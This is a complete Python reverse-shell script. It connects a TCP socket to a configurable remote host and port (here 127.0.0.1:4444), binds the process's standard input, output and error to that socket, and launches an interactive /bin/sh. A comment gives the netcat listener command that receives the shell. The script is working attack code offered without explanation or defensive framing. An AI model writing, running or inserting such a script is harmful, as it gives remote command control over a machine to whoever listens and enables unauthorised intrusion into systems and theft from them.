#!/usr/bin/python
# -*- coding: utf-8 -*-

# $ nc -v -l -p 4444
# $ python reverse-shell.py

import socket
import os
import subprocess


HOST = '127.0.0.1' # remote host
PORT = 4444        # remote port

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((HOST,PORT))

os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)

c = subprocess.call(["/bin/sh","-i"])